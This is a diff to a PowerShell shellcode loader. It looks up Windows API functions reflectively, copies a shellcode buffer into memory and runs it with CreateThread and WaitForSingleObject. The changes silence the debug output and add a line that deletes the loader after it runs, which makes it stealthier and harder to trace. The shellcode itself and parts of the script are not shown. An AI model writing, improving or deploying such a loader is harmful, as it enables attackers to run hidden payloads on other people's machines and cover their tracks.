@@ -15,10 +15,10 @@ function LookupFunc {
     $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
     [IntPtr] $result = 0;
     try {
-        Write-Host "First Invoke - $moduleName $functionName";
+        # Write-Host "First Invoke - $moduleName $functionName";
         $result = $tmp[0].Invoke($null, @($handle, $functionName));
     }catch {
-        Write-Host "Second Invoke - $moduleName $functionName";
+        # Write-Host "Second Invoke - $moduleName $functionName";
         $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
         $result = $tmp[0].Invoke($null, @($handle, $functionName));
     }
@@ -36,3 +36,4 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 [System.Runtime.InteropServices.Marshal]::Copy($shellc, 0, $lpMem, $shellc.Length)
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+rm Loader
